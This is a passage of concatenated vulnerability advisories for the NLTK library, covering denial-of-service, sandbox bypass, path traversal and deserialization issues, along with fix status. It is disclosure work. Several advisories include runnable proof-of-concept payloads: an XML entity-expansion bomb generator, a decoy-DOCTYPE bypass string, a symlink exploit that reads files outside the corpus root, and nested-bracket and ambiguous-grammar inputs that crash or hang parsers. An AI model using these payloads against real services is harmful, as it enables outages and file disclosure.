This was confirmed by running the shipped parser: the payloads complete without a `ValueError` or a regex `TimeoutError` while consuming quadratic CPU (Vector A shows a clean 4x cost per input doubling). A repository search finds no line-length or category-width cap anywhere on the `fromstring` path; the regex source-length limit bounds regex patterns, not lexicon text. The strongest disproof attempt (that CPython in-place string concatenation makes Vector A linear) fails because `rest = rest[1:]` is an unconditional copy of the remaining input that the concatenation fast path cannot elide, and the measured 4x-per-doubling ratio confirms the quadratic empirically.

## Affected Versions

- `Ecosystem: PyPI (pip)`
- `Package: nltk`
- `Confirmed affected range: <= 3.10.3`
- `Latest release checked: 3.10.3 (PyPI, https://pypi.org/pypi/nltk/json)`
- `Fix status: 3.10.4`

The width-slicing loops ship in every release carrying the CCG lexicon parser and are present in the current latest published release, 3.10.3. The lower boundary was not bisected, so the introducing version is left open; the behavior long predates the recent regular-expression and recursion-depth hardening.

## Suggested Fix

Scan the bracket body and the operator chain with an index cursor into the original string (or a `collections.deque`) instead of repeatedly re-slicing or re-copying the tail, so each character is handled in constant amortized time. As defense in depth, impose an explicit bound on lexicon line length and category width at the `fromstring` chokepoint and raise a bounded error when it is exceeded, mirroring the existing depth guard. No configuration-only mitigation fully removes the exposure for a service that must parse untrusted lexicons; until a fix ships, callers should cap the size of accepted lexicon input and parse it under a CPU or time budget in an isolated worker.

Reported by zx (GitHub: @manus-pi).


## Fix status

PR: #3753 "[Do not merge yet] Fix GHSA-8mgp-746c-j5xp: URL-scheme bypass of pathsec.validate_path", open; head da55cab0e at the time of this note (a develop merge on top of 238f81500, the head on which the verdicts below were measured).

Fix commit: cf12a5e6a (nltk/ccg/lexicon.py: matchBrackets, nextCategory and augParseCategory thread a cursor instead of re-slicing the tail; the trailing capture group is dropped; MAX_PARSE_LEN=100000 caps the input).

Probe: nltk/test/unit/security_probes/ghsa_89p3_fcch_88ph.py (on the PR). Verdict on the PR head: FIXED (scaling 4.4x over a 4x input; an over-cap chain is rejected by MAX_PARSE_LEN). The advisory PoC re-run on develop 2fa3f48fe: vector A (bracket body, 100k vs 400k) 15.8x and vector B (operator chain, 8k vs 32k) 11.3x over a 4x input, so develop is still VULNERABLE.

vulnerabilities.summary: NLTK: Unbounded CPU consumption in SteppingRecursiveDescentParser.parse() with ambiguous or self-embedding grammars
vulnerabilities.details:
## Summary

`nltk.parse.recursivedescent.SteppingRecursiveDescentParser.parse()` performs an unbounded top-down search over ambiguous or self-embedding context-free grammars with no wall-clock or step limit. An actor who can influence the grammar and supply a short input to a caller that uses this parser can force a single `parse()` call to pin a CPU core indefinitely, producing a denial of service. The related base class `RecursiveDescentParser` gained a `max_time` wall-clock deadline, but the stepping subclass drives its own step loop and never arms or consults that deadline, and its constructor does not accept a `max_time` parameter, so the guard cannot be enabled on this path.

## Root Cause

`RecursiveDescentParser` bounds its recursive search inside `_parse`: it arms a wall-clock deadline on the first step and raises `TimeoutError` once `max_time` (default 5.0 seconds) is exceeded. `SteppingRecursiveDescentParser` was designed for interactive single-stepping and overrides both `parse()` and `_parse`. Its `parse()` runs `initialize()` followed by a `while self.step() is not None` loop that never enters the guarded base `_parse`. Its `_parse` override is a state-capturing stub that records history and returns a sentinel, and it never references the inherited `self._parse_deadline` or `self._max_time`. Its `__init__` signature omits `max_time` entirely, so a caller cannot enable or tighten a bound. The security invariant that a single parse must terminate within a bounded time is therefore never enforced on this parser.

```text
Affected component: nltk.parse.recursivedescent.SteppingRecursiveDescentParser
- parse()      nltk/parse/recursivedescent.py:428-433  (drives its own step loop, no bound armed or checked)
- _parse()     nltk/parse/recursivedescent.py:643-668  (stub override; never consults self._parse_deadline / self._max_time)
- __init__()   nltk/parse/recursivedescent.py:410-418  (signature (self, grammar, trace=0); no max_time parameter)
Base guard for comparison: RecursiveDescentParser._parse nltk/parse/recursivedescent.py:141-150
```

## Impact

An actor who controls or influences the grammar passed to `SteppingRecursiveDescentParser` and can supply a short token sequence to a caller that invokes `parse()` can cause that call to never return. The top-down search enumerates a derivation space that grows on the order of the Catalan numbers with no memoization of the search and no deadline, so one crafted grammar plus a short input deterministically consumes a CPU core. In a deployment that parses attacker-influenced input on a bounded worker pool, repeated requests exhaust the pool and deny service to legitimate users. No authentication, privilege, or user interaction is required in that worst-credible deployment. Exploitation requires that the target actually use this parser on untrusted input; because the stepping parser is primarily a debugging or interactive-stepping component that backs a GUI, real-world exposure is narrower than for the base parser, though `parse()` is a supported public method that behaves as a full parser.

## Proof of Concept

`Requires only the nltk package (3.10.3) and standard library; no data downloads or network access.`

Reproduction steps:
1. Build an ambiguous, self-embedding grammar such as `S -> 'a' S S | 'a'`.
2. Confirm the base parser self-terminates: `RecursiveDescentParser(g, max_time=2.0).parse(['a']*17)` raises `TimeoutError` at about 2 seconds.
3. Run the stepping parser on the same grammar and input and observe it never returns.

```python
import time, inspect
from nltk import CFG
from nltk.parse.recursivedescent import RecursiveDescentParser, SteppingRecursiveDescentParser

g = CFG.fromstring("S -> 'a' S S | 'a'")

# Base parser is bounded and self-terminates.
try:
    list(RecursiveDescentParser(g, max_time=2.0).parse(['a'] * 17))
except TimeoutError:
    print("base: TimeoutError (guarded)")

# Stepping subclass cannot be bounded: no max_time parameter.
print("stepping __init__ sig:", inspect.signature(SteppingRecursiveDescentParser.__init__))

# Stepping parser runs unbounded on the same input.
t0 = time.perf_counter()
list(SteppingRecursiveDescentParser(g).parse(['a'] * 17))  # does not return
print("stepping: returned after", time.perf_counter() - t0)
```

```text
base: TimeoutError (guarded)
stepping __init__ sig: (self, grammar, trace=0)
# stepping len3: 1 parse in 0.001s ; len7: 5 in 0.017s ; len9: 14 in 0.075s ; len11: 42 in 0.36s
# stepping len17: still running past a 10s watchdog, process alive, no RecursionError
```

## Attack Chain

1. **Exposure:** A caller uses `nltk.parse.SteppingRecursiveDescentParser`, a public exported symbol (`nltk/parse/__init__.py:97`), invoking `parse(tokens)` on grammar and input influenced by an actor.
2. **Control:** The actor influences the grammar (an ambiguous, self-embedding CFG such as `S -> 'a' S S | 'a'`) and supplies a short token list (for example 17 copies of `'a'`). Both survive to the parser unchanged.
3. **Path:** `parse()` (`recursivedescent.py:428`) calls `initialize()` then loops `while self.step() is not None`; `step()` (`:479`) calls `match()`/`expand()` (`:552`/`:512`) which call the inherited `_match`/`_expand` (`:172`/`:214`), which resolve `self._parse` by MRO to the subclass stub (`:643`).
4. **Guard:** The `max_time` wall-clock deadline exists only in the base `_parse` (`:141-150`) and is never entered on this path; the stub `_parse` records state and returns without consulting the deadline, and `__init__` exposes no `max_time` to enable a bound.
5. **Primitive:** The unbounded top-down search enumerates a Catalan-number-sized derivation space with no memoization and no deadline.
6. **Result:** The `parse()` call never returns and pins a CPU core; repeated calls exhaust a bounded worker pool, denying service.

## Bypass Evidence

The prior fix for this class of issue added a `max_time` wall-clock deadline to the base `RecursiveDescentParser._parse` (`recursivedescent.py:141-150`, default 5.0 seconds). This report demonstrates that the fix does not cover the sibling `SteppingRecursiveDescentParser` entry point, and the maintainers separately hardened other parsers (chart, earley chart, viterbi, shift-reduce, non-projective dependency) with `max_time` while leaving this subclass unbounded.

Challenges attempted and their outcomes:
- Hypothesis that the inherited `self._max_time` value (observed at 5.0) makes the path guarded: refuted; the value is inherited but never read on the stepping path, and the parser runs unbounded despite it being set.
- Hypothesis that a caller can bound the parser via the constructor: refuted; `inspect.signature(SteppingRecursiveDescentParser.__init__)` is `(self, grammar, trace=0)`, with no `max_time` parameter.
- Hypothesis that the failure is merely an early `RecursionError` rather than CPU exhaustion: refuted; the step loop is iterative over an explicit history stack, so no exception is raised within a 10 second watchdog, CPU time grows exponentially with input length, and a small negative control input returns in about 0.001 seconds.
- Hypothesis that the `_tried_e`/`_tried_m` records collapse the search: refuted; those records are keyed by the frozen full partial tree, so they deduplicate only identical productions at identical states and do not prevent the exponential enumeration.

## Affected Versions

- `Ecosystem: PyPI`
- `Package: nltk`
- `Confirmed affected range: <= 3.10.3`
- `Latest release checked: 3.10.3 (PyPI sdist nltk-3.10.3.tar.gz)`
- `Fix status: 3.10.4`

The stepping subclass has never carried a time or step bound in any released version; the prior fix added the guard only to the base class. The vulnerable methods were verified present in the exact published PyPI 3.10.3 source distribution (`parse()` at lines 428-433, stub `_parse` at 643-668 with no deadline reference, and `__init__` without `max_time`). Because the class predates the prior fix and no specific historical introduction tag was pinned, the lower bound is left open rather than invented; the upper bound is verified against the current published artifact (3.10.3). No released fix exists.

## Suggested Fix

Enforce a bounded parse on the stepping parser: give `SteppingRecursiveDescentParser` its own wall-clock or step-count budget that is checked inside its step loop (for example in `parse()` and/or the `_parse`/`step` path), and add a `max_time` (or equivalent step-limit) parameter to `__init__` that is propagated and honored, mirroring the base `RecursiveDescentParser` and the other hardened sibling parsers. As an interim mitigation without a code change, callers should avoid invoking `SteppingRecursiveDescentParser.parse()` on grammars or input derived from untrusted sources, run any such parsing under an external timeout or a separate resource-limited process, and prefer a chart parser for untrusted input.

---

Reported by zx (GitHub: @manus-pi).


## Fix status (2026-09-28)

PR: #3895 "[WIP] Bound algorithmic-DoS and uncontrolled-recursion vectors (CWE-400/407/674/1333)", open, head b22ebe144.

Fix commit: e20c40e26 "Bound tokenizer/parser algorithmic DoS (ffr9/gpwc/8fx7)" (SteppingRecursiveDescentParser gains the max_time parameter, default 5.0 s, and honours the parse deadline).

No probe. The advisory PoC re-run (grammar S -> 'a' S S | 'a', 17 tokens): on the PR head the parse raises TimeoutError after 5.0 s and the constructor signature is (self, grammar, trace=0, max_time=5.0); on develop 2fa3f48fe the same parse ran past a 45 s watchdog, so develop is still VULNERABLE.

Release: none.

vulnerabilities.summary: NLTK: Model-artifact APIs bypass pathsec and touch files outside allowed roots
vulnerabilities.details:
### Summary

Several model-artifact APIs still treat caller-controlled model paths as ordinary filenames even when NLTK path security is enforced. The same outside-root paths are rejected by guarded helpers, but these public read and write flows still use raw file APIs.

### Details

- **Vulnerability type:** File sandbox bypass
- **Affected component:** `TransitionParser.train`, `TransitionParser.parse`, `AveragedPerceptron.save`, `AveragedPerceptron.load`, `PerceptronTagger.save_to_json`, `save_maxent_params`
- **Affected versions:** Published `3.9.4` and current source `v3.10.0-rc2` both reproduced.
- **Patched versions:** Not yet patched
- **Root cause:** Model import and export helpers use built-in `open()` on caller-controlled paths instead of pathsec-aware helpers.

`TransitionParser.train()` writes outside allowed roots, `TransitionParser.parse()` reads outside allowed roots, `AveragedPerceptron` bypasses the sandbox in both directions, and adjacent read-side helpers in the same family already show the intended guarded behavior. I confirmed outside-root reads and writes while `pathsec.open()` or the guarded sibling helpers rejected the same paths.

### PoC

**Preconditions**
- The application enables `pathsec` enforcement and lets untrusted workflows choose model import or export paths.

**Steps**
1. Enable `pathsec.ENFORCE=True` and restrict allowed roots to a dedicated sandbox directory.
2. Use public model import or export APIs with paths that point outside that root.
3. Observe the same paths are rejected by negative-control guarded helpers such as `pathsec.open()`, `PerceptronTagger.load_from_json()`, or `load_maxent_params()`.
4. Observe the vulnerable APIs still read or write outside-root files successfully.

**Minimal reproducible excerpt**

```text
transition_train_exists True
transition_parse_loader_read_bytes 13
averaged_load_keys ['bias']
maxent_save wrote ['alwayson.tab', 'labels.txt']
```

### Impact

Consumers that rely on `pathsec` for local containment can be tricked into reading or overwriting files outside approved roots through normal model persistence and loading APIs.

### Remediation

Route all model-path file access through `nltk.pathsec.open()` or existing pathsec-aware helpers, and add regression tests that pair each vulnerable API with a negative control on the same path.

### References

- https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/parse/transitionparser.py#L551-L571
- https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/tag/perceptron.py#L106-L113
- https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/tag/perceptron.py#L262-L273
- https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/classify/maxent.py#L1583-L1602

vulnerabilities.summary: NLTK: Pl196xCorpusReader has quadratic ReDoS on malformed TEI blocks
vulnerabilities.details:
### Summary `Pl196xCorpusReader` still parses whole TEI blocks with multiple lazy regexes over attacker-controlled text. A malformed file with many opening tags and no matching closing tags forces repeated rescans and produces quadratic CPU growth in public reader APIs. ### Details - **Vulnerability type:** Regular-expression denial of service - **Affected component:** `nltk.corpus.reader.pl196x.TEICorpusView.read_block` and `Pl196xCorpusReader` public methods - **Affected versions:** Published `3.9.4` and current source `v3.10.0-rc2` both reproduced. - **Patched versions:** Not yet patched - **Root cause:** Lazy `.*?` whole-block regexes rescan untrusted XML-like blocks from each opening-tag position. The parser uses regexes for paragraphs, sentences, and word tags across the whole `` block. When the attacker supplies many unmatched opening tags, each attempt scans toward the end of the block and fails, then restarts from the next opening tag. There is near four-times runtime growth each time the number of malformed `

` tags doubled, through normal public calls such as `words()` and `tagged_words()`. ### PoC **Preconditions** - The application parses attacker-influenced PL196X or TEI-like corpus files through public reader APIs. **Steps** 1. Create a corpus file with a valid header followed by a `` block that contains many opening tags and no matching closing tags. 2. Instantiate `Pl196xCorpusReader` on that corpus. 3. Call `words()` or `tagged_words()` and measure elapsed time as the malformed tag count doubles. 4. Observe near quadratic growth instead of near-linear behavior. **Minimal reproducible excerpt** ```text size=1000 0.014s size=2000 0.057s size=4000 0.231s size=8000 0.927s ``` ### Impact A consumer that accepts attacker-influenced corpus files can be forced into heavy CPU use and parser-thread stalling before the application concludes the input contains no valid content. ### Remediation Replace the whole-block lazy-regex parser with a linear parser or bounded tokenizer, and add regression tests that assert near-linear behavior on malformed inputs with many unmatched tags.

vulnerabilities.summary: NLTK: Entity-expansion DoS (billion laughs) via remaining raw ElementTree parses
vulnerabilities.details:
Several XML parsing sites in NLTK still used `xml.etree.ElementTree` directly, which honours `<!ENTITY>` declarations in a document's internal DTD subset. A crafted document a few hundred bytes long can expand to megabytes in memory (each nesting level multiplies by ten), a denial-of-service.

Affected call sites (<= 3.10.2):
- `nltk.chunk.named_entity.load_ace_file` — parses ACE annotation XML
- `nltk.internals.ElementWrapper` — converts any given string to an Element
- `nltk.downloader` — `Package.fromxml`, `Collection.fromxml`, `_find_collections`, `_find_packages`

libexpat 2.6.0 added an input-amplification cap, but it only engages above an activation threshold (~8 MiB output) and depends on whichever libexpat the interpreter links; builds against older libexpat have no cap at all. External entities are not resolved by ElementTree, so this is a memory-amplification DoS (CWE-776), not XXE/file disclosure.

This completes the earlier defusedxml adoption that these sites were missed by. Fix routes all of them through a new `nltk.xmlsec` module that refuses entity declarations, preferring `defusedxml` and falling back to a standard-library `xml.parsers.expat` pre-scan when defusedxml is absent.

---

## Attack demonstration

Reproducible PoC against a real affected entry point (`nltk.internals.ElementWrapper`). Every number below is captured output, not illustrative.

### 1. The amplification (vulnerable path: raw `xml.etree.ElementTree`)

A payload of a few hundred bytes expands to megabytes in memory. Each nesting level multiplies output by 10 while adding ~56 bytes of input:

| levels | input bytes | expanded bytes | factor |
|--------|-------------|----------------|--------|
| 3 | 218 | 10,000 | x45 |
| 4 | 274 | 100,000 | x364 |
| 5 | 330 | 1,000,000 | x3,030 |
| 6 | 386 | (libexpat 2.7.1 cap trips) | - |

The level-6 cap is **libexpat's**, not NLTK's: it only engages above an ~8 MiB activation threshold, and older libexpat builds (still shipped with many 3.10/3.11 interpreters) have no cap at all. Under the threshold — up to ~1 MB per parse here — expansion always succeeds.

```python
import xml.etree.ElementTree as ET
def bomb(levels):
    d = "\n".join(f'<!ENTITY e{i} "{("&e%d;"%(i-1))*10}">' for i in range(1, levels+1))
    return f'<!DOCTYPE d [<!ENTITY e0 "AAAAAAAAAA">{d}]><d>&e{levels};</d>'
ET.fromstring(bomb(5))   # -> element whose .text is 1,000,000 chars
```

### 2. The patched entry point rejects it

```
>>> from nltk.internals import ElementWrapper
>>> ElementWrapper(bomb(5))
EntitiesForbidden: EntitiesForbidden(name='e0', ...)
```

### 3. Why a text-based screen is not enough

An entity declaration can hide behind a decoy `<!DOCTYPE>` in a prolog comment. Raw ElementTree still processes the real declaration and expands; a guard that walks the DOCTYPE text is fooled. The shipped guard re-parses with expat, so it is not:

```python
evil = '<!-- <!DOCTYPE x [ ] > --><!DOCTYPE d [<!ENTITY a "PPPP...">]><d>&a;</d>'
```

```
raw ElementTree -> EXPANDS ('PPPPPPPPPPPP...', 40 chars)
nltk.xmlsec     -> REJECTED (EntitiesForbidden)
```

An earlier draft of the fallback that walked the text **was** bypassed by this and 4 similar payloads (decoy DOCTYPE in a PI, stray `]` inside a PI in the internal subset). All five are now regression tests.

### 4. Both back ends block it

`nltk.xmlsec` prefers `defusedxml` and falls back to a stdlib `xml.parsers.expat` pre-scan. Same payloads, defusedxml hidden to force the fallback:

```
stdlib fallback | billion-laughs               -> REJECTED (EntitiesForbidden)
stdlib fallback | comment-decoy differential   -> REJECTED (EntitiesForbidden)
```

Environment: python 3.13.7, libexpat 2.7.1. Confirmed identical amplification on python 3.10 (NLTK's floor).

vulnerabilities.summary: NLTK Stanford wrapper classes execute untrusted JAR files without verification
vulnerabilities.details: In nltk/nltk versions 3.9.3 and earlier, five Stanford interface classes (StanfordPOSTagger, StanfordNERTagger, StanfordParser, StanfordDependencyParser, and StanfordNeuralDependencyParser) are vulnerable to untrusted JAR code execution. These classes accept user-controllable JAR paths and execute them via the `java()` function, which invokes `subprocess.Popen()` without integrity verification. This vulnerability is identical to CVE-2026-0848, which was fixed for StanfordSegmenter by adding SHA256 verification. However, the fix was not applied to these additional classes, leaving them susceptible to arbitrary code execution when loading untrusted JAR files.

vulnerabilities.summary: ntlk unsafe deserialization vulnerability
vulnerabilities.details: NLTK through 3.8.1 allows remote code execution if untrusted packages have pickled Python code, and the integrated data package download functionality is used. This affects, for example, averaged_perceptron_tagger and punkt.

vulnerabilities.summary: NLTK CrubadanCorpusReader path traversal allows arbitrary file disclosure
vulnerabilities.details: NLTK 3.9.4 through 3.10.2 contains a path traversal vulnerability in CrubadanCorpusReader. _load_lang_ngrams joins the corpus root with crubadan_code, the column-0 value read from the corpus table.txt mapping file, and opens the result with the builtin open() rather than the pathsec-validated opener, so os.path.join discards the root when that value is absolute and the read escapes the corpus directory without the containment check nltk.pathsec applies when ENFORCE is set. An attacker who controls a corpus package can disclose file contents outside the corpus root through lang_freq, limited to paths ending in -3grams.txt whose contents parse as token count lines.

vulnerabilities.summary: NLTK: Uncontrolled recursion in nltk.featstruct.FeatStructReader causes unhandled RecursionError (DoS) via deeply nested feature-structure input
vulnerabilities.details:
### Summary

`nltk.featstruct.FeatStructReader` (used by `FeatStruct(str)` and by `FeatureGrammar.fromstring()`) parses feature-structure strings such as `[a=1]` with a recursive-descent parser that has no nesting-depth limit. A small, trivially-crafted input (~700 bytes) with deeply nested brackets drives the parser past Python's recursion limit and raises an **unhandled `RecursionError`** instead of the library's normal, catchable `ValueError`/`LogicalExpressionException`. Any application that parses user-supplied feature-structure or feature-grammar text (e.g. NLP teaching tools, grammar "playgrounds", unification-grammar-based NLU pipelines) can be crashed by an unauthenticated input with no special privileges. This is a Denial of Service issue (CWE-674, Uncontrolled Recursion), not a memory-safety or code-execution issue.

This appears to be the same bug class as two issues already fixed elsewhere in the codebase — `nltk/jsontags.py` (`JSONTaggedDecoder.decode_obj`, guarded by `MAX_DECODE_DEPTH = 200`) and `nltk/sem/logic.py` (`LogicParser`, guarded by `MAX_PARSE_DEPTH = 200`) — but `nltk/featstruct.py` does not have an equivalent guard.

### Details

The recursive call chain (current `develop` branch, `nltk/featstruct.py`):

1. `FeatStructReader.fromstring()` ([`featstruct.py:2184`](nltk/featstruct.py#L2184)) calls `read_partial()` → `_read_partial()` ([`featstruct.py:2250`](nltk/featstruct.py#L2250)).
2. `_read_partial()` dispatches to `_read_partial_featdict()`, which calls `_read_value()` ([`featstruct.py:2436`](nltk/featstruct.py#L2436)) for each feature's value.
3. `_read_value()` calls `read_value()` ([`featstruct.py:2442`](nltk/featstruct.py#L2442)), which matches the value against `VALUE_HANDLERS` ([`featstruct.py:2478`](nltk/featstruct.py#L2478)).
4. If the value itself starts with `[` (a nested feature structure), the matched handler is `read_fstruct_value` ([`featstruct.py:2479`](nltk/featstruct.py#L2479), defined at [`featstruct.py:2495`](nltk/featstruct.py#L2495)):
   ```python
   def read_fstruct_value(self, s, position, reentrances, match):
       return self.read_partial(s, position, reentrances)
   ```
   This calls `read_partial()` again, which re-enters `_read_partial()` — the same function from step 1.

This closes a recursive cycle (`_read_partial → _read_value → read_value → read_fstruct_value → read_partial → _read_partial → ...`) with **no depth counter, no `MAX_*_DEPTH` constant, and no `try/except RecursionError`** anywhere in the class. Each additional `[` in the input adds one more full cycle of Python stack frames. Once the input nests deeply enough, Python's own recursion-limit protection fires and raises `RecursionError`, which is not a subclass of `ValueError` (the exception type this parser's own `_error()` helper raises for normal, well-formed parse errors) and therefore propagates uncaught through this API.

For comparison, `nltk/sem/logic.py`'s `LogicParser` was hardened against exactly this class of issue:
```python
#: Maximum expression-nesting depth the recursive-descent parser will
#: descend to. Deeply nested input would otherwise recurse until Python
#: raises an uncaught RecursionError and crashes the caller
#: (uncontrolled recursion, CWE-674); past this depth a normal
#: LogicalExpressionException is raised instead. Configurable.
MAX_PARSE_DEPTH = 200
```
(`nltk/sem/logic.py:102-107`), and `nltk/jsontags.py`'s `JSONTaggedDecoder` similarly has `MAX_DECODE_DEPTH = 200` with an explicit depth check. `nltk/featstruct.py` has no analogous protection.

`FeatureGrammar.fromstring()` (`nltk/grammar.py`) parses feature structures embedded in FCFG grammar rules via the same `FeatStructReader`, so the same crash is reachable through grammar-string parsing as well as through `FeatStruct()` directly.

### PoC

Verified against the current `develop` branch in a clean virtualenv (Python 3.12, NLTK installed from this checkout via `pip install -e .`):

```python
from nltk.featstruct import FeatStruct

depth = 167
payload = "[a=" * depth + "1" + "]" * depth   # 669 bytes
FeatStruct(payload)
```

Result:
```
Traceback (most recent call last):
  ...
  File ".../nltk/featstruct.py", line 2310, in _read_partial_featdict
    value, position = self._read_value(name, s, position, reentrances)
  File ".../nltk/featstruct.py", line 2440, in _read_value
    return self.read_value(s, position, reentrances)
  File ".../nltk/featstruct.py", line 2446, in read_value
    return handler_func(s, position, reentrances, match)
  [... repeats ~167 times ...]
RecursionError: maximum recursion depth exceeded
```

- Crash threshold: nesting depth 167 (binary-searched between 50 and 200).
- Payload size: 669 bytes — fits trivially in a single HTTP request body/query parameter.
- Time to crash: <2ms — no resource exhaustion is needed, only recursion depth.

Minimal reproduction (no server required):
```bash
python3 -c "
from nltk.featstruct import FeatStruct
FeatStruct('[a=' * 200 + '1' + ']' * 200)
"
```

Illustrative server-side context (not part of NLTK itself, but representative of how the bug becomes reachable):
```python
from flask import Flask, request
from nltk.featstruct import FeatStruct

app = Flask(__name__)

@app.route("/parse", methods=["POST"])
def parse_grammar():
    return {"result": str(FeatStruct(request.json["grammar"]))}
```
A POST of `{"grammar": "[a=" * 200 + "1" + "]" * 200}` to this endpoint raises the uncaught `RecursionError` inside the request handler.

### Impact

**Vulnerability type:** Denial of Service via uncontrolled recursion (CWE-674). This is not a memory-corruption bug and does not lead to code execution or data disclosure — Python's own recursion-limit safety net converts what would be a C-level stack overflow into a catchable (but here, uncaught) `RecursionError`.

**Who is affected:** Any application that passes externally-supplied text into `nltk.featstruct.FeatStruct()` or `nltk.grammar.FeatureGrammar.fromstring()` — for example, NLP/computational-linguistics teaching tools, unification-grammar demo services, or NLU pipelines that accept user-authored feature grammars. This is a narrower slice of NLTK's user base than, e.g., tokenization or POS tagging, since feature-structure/unification-grammar parsing is a more specialized part of the library.

**Practical severity depends on deployment:**
- In typical WSGI-style web frameworks (Flask/Django/FastAPI behind gunicorn/uwsgi), an uncaught exception inside a request handler is caught at the framework/server boundary: the single request fails (HTTP 500), the worker process itself survives, and unaffected requests are unimpacted.
- In single-threaded or per-task-unprotected contexts (e.g. a queue-consuming worker without per-task exception isolation), the uncaught `RecursionError` can terminate the entire process; without a process supervisor that auto-restarts it, this is a persistent outage until manually restarted. An attacker who repeats the payload can keep such a worker in a crash loop for as long as the attack continues.

**Suggested fix:** Add a depth counter and a `MAX_PARSE_DEPTH`-style constant to `FeatStructReader`, mirroring the existing fix in `nltk/sem/logic.py`, and raise the library's normal `ValueError`-based parse error once the limit is exceeded instead of letting `RecursionError` propagate.

vulnerabilities.summary: NLTK: Downloader.download follows hardlinks and overwrites outside-root files
vulnerabilities.details:
### Summary

NLTK's downloader now blocks symlink escapes during ZIP extraction, but it still treats pre-existing hardlinks inside the install tree as ordinary in-root files. A normal package install can therefore overwrite an outside-root inode through that hardlink.

### Details

- **Vulnerability type:** Filesystem containment bypass
- **Affected component:** `nltk.downloader.Downloader.download`, `nltk.downloader.Downloader.incr_download`
- **Affected versions:** Published `3.9.4` and current source `v3.10.0-rc2` both reproduced for the extraction-stage overwrite.
- **Patched versions:** 3.10.3
- **Root cause:** The downloader validates traversal and symlink conditions but does not reject pre-existing hardlink aliases inside the install tree.

The install flow correctly rejects a pre-existing symlink at an extraction target, yet it accepts a pre-existing hardlink at the same path. When the package is installed, extracted member data is written through the hardlink and mutates the outside inode.

### PoC

**Preconditions**
- The attacker can plant files inside a writable shared downloader root on the same filesystem as the target file.

**Steps**
1. Prepare a downloader root and create a hardlink inside it that points to an outside target file.
2. Confirm a symlink at the same path is rejected as a negative control.
3. Run a normal `Downloader.download()` package install whose extracted member lands on the hardlink path.
4. Observe the outside target file is overwritten while the downloader still reports the package as installed.

**Minimal reproducible excerpt**

```text
extract_hardlink_before ORIGINAL
extract_hardlink_after PWNED
extract_hardlink_status installed
```

### Impact

A shared or attacker-influenced downloader directory can be turned into an overwrite primitive against same-filesystem files outside the intended install root.

### Remediation

Treat pre-existing hardlinks as unsafe in extraction targets, verify that each write path stays within the intended install tree at the inode level, and add regression tests that pair hardlinks with existing symlink controls.

vulnerabilities.summary: NLTK: Symlink-based sandbox bypass in FramenetCorpusReader (bypasses the fix for CVE-2026-54292)
vulnerabilities.details:
This is a **new, distinct vulnerability**: a bypass of the fix already published as [GHSA-xh95-f55m-82fw](https://github.com/nltk/nltk/security/advisories/GHSA-xh95-f55m-82fw) ("Path traversal in NLTK FramenetCorpusReader.frame() allows arbitrary XML file read, bypassing the nltk.pathsec sandbox"), not a duplicate of it.

## Summary

The original advisory was fixed (PR [#3581](https://github.com/nltk/nltk/pull/3581)) by adding `_reject_unsafe_path_component()`, which blocks literal `/`, `\`, `..`, and Windows drive prefixes in caller-/corpus-supplied names. It never resolves symlinks. All three call sites that use this guard still resolve the resulting path through `self.abspath()` (`nltk/corpus/reader/api.py`, `self._root.join(fileid)`), which is a plain lexical join, not the symlink-resolving, `required_root`-scoped check that `CorpusReader.open()` (and `NKJPCorpusReader`'s own fix for its sibling advisory) correctly use elsewhere in this same codebase.

A symlink placed inside the corpus's own subdirectory, with a name containing no separators at all, passes the guard cleanly and reads a file completely outside the corpus root.

## Affected code (`nltk/corpus/reader/framenet.py`)

- `frame_by_name()` reads `<frame_dir>/<name>.xml`
- `_lu_file()` reads `<lu_dir>/lu<id>.xml`
- `doc()` reads `<fulltext_dir>/<filename>`

All three follow the same chain: `_reject_unsafe_path_component(value, ...)`, then `self.abspath(os.path.join(subdir, value))`, then `XMLCorpusView(...)`, opened via `PathPointer.open()` with no `required_root`.

## Proof of concept

Self-contained, runnable end to end.

```python
import os
import tempfile

from nltk.corpus.reader.framenet import FramenetCorpusReader

root = tempfile.mkdtemp()
corpus_root = os.path.join(root, "framenet_v17")
frame_dir = os.path.join(corpus_root, "frame")
secret_dir = os.path.join(root, "outside_framenet_root")
os.makedirs(frame_dir)
os.makedirs(secret_dir)

with open(os.path.join(corpus_root, "frRelation.xml"), "w") as f:
    f.write("<frameRelations/>")

secret_path = os.path.join(secret_dir, "stolen.xml")
with open(secret_path, "w") as f:
    f.write(
        '<frame cBy="000" cDate="01/01/2000" name="StolenFrame" ID="999999">'
        "<definition>THIS CAME FROM OUTSIDE THE FRAMENET CORPUS ROOT</definition>"
        "</frame>"
    )

# Attacker plants this inside <corpus_root>/frame/. No path separators,
# so it passes _reject_unsafe_path_component cleanly.
link_path = os.path.join(frame_dir, "evil_link.xml")
os.symlink(secret_path, link_path)

reader = FramenetCorpusReader(corpus_root, [])
reader._frame_idx = {"__dummy__": {"name": "__dummy__"}}  # skip unrelated index build

result = reader.frame_by_name("evil_link")   # normal, routine call, no ".." anywhere
print("frame name:", result["name"])
print("definition:", result["definition"])
```

Actual output when run against unpatched `main` (commit `35813c8`):

```
frame name: StolenFrame
definition: THIS CAME FROM OUTSIDE THE FRAMENET CORPUS ROOT
```

That content was read from `secret_path`, a file entirely outside `corpus_root`, via a single, unmodified, public API call. No exception is raised anywhere in the chain; `_reject_unsafe_path_component` passes because `"evil_link"` contains no separators, `..`, or drive prefix.

Verified the same way for the other two affected call sites, `_lu_file()` (`lu<id>.xml` symlink under `lu/`) and `doc()` (arbitrary filename symlink under `fulltext/`), both succeeding identically with no exception raised.
## Why this is in scope

- No malicious file for a victim to open, no special user interaction. Just a tampered/shared corpus directory (NLTK's own `SECURITY.md` names "shared environments... multi-tenant pipelines" as its threat model) plus a completely normal API call.
- Core corpus-reader code, not a demo/GUI tool.
- Confirmed unintentional: PR #3581's own description states the goal was to route through "the `nltk.pathsec` sandbox... including the strict `ENFORCE=True` mode" and be "consistent with the validation already used elsewhere in NLTK." It doesn't achieve that, since `abspath()` never reaches the scoped, symlink-resolving check that exists and is used correctly elsewhere in the same file tree (`NKJPCorpusReader`).

## Suggested fix

Route all three call sites through `CorpusReader.open()` (or pass `required_root=self._root` to `validate_path()` directly, as `NKJPCorpusReader` already does), instead of `self.abspath()` plus raw `PathPointer.open()`.

vulnerabilities.summary: Inefficient Regular Expression Complexity in nltk (word_tokenize, sent_tokenize)
vulnerabilities.details:
### Impact
